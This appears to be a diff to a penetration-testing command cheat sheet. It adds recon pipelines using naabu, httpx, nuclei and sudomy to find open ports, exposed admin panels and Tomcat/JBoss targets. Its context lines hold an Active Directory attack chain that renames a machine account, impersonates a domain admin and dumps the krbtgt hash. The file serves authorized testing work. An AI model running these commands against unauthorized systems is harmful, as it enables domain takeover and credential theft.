@@ -313,8 +313,11 @@ certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontro
 echo '8.8.8.8' | hakrevdns
 prips 192.168.0.0 192.168.0.255
 prips -i4 192.168.0.10 192.168.0.250
-prips 173.0.84.0/24 | hakrevdns
-nuclei -u https://example.com
+prips 173.0.84.0/24 | hakrevdns -d
+cat domain.txt |naabu -pf ports -c 10 -silent |anew open_ports.txt
+cat open_ports.txt |httpx -t 10 -silent|anew webservers.txt
+cat webservers.txt|nuclei -silent -max-host-error 10 -t /root/nuclei-templates/exposed-panels -rl 15 -stats -o panels.txt
+cat webservers.txt|nuclei -silent -max-host-error 10 -tags tomcat,jboss,ibm -rl 15 -stats -o app.txt
 ntpdate -u 192.168.56.101
 renameMachine.py -current-name "testcomputer$" -new-name "DC01" -dc-ip dc01 "domain"/"user1":"complexpassword"
 getTGT.py -dc-ip dc01 "domain.local"/"DC01":"123pentest"
@@ -322,4 +325,5 @@ renameMachine.py -current-name "DC01" -new-name "testcomputer$" -dc-ip dc01 "dom
 KRB5CCNAME="DC01.ccache" getST.py -self -impersonate "domainadmin" -spn "cifs/dc01.domain.local" -k -no-pass -dc-ip dc01 "domain.local"/"dc01"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
 KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
+sudomy -d domain.com -rS -sC
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
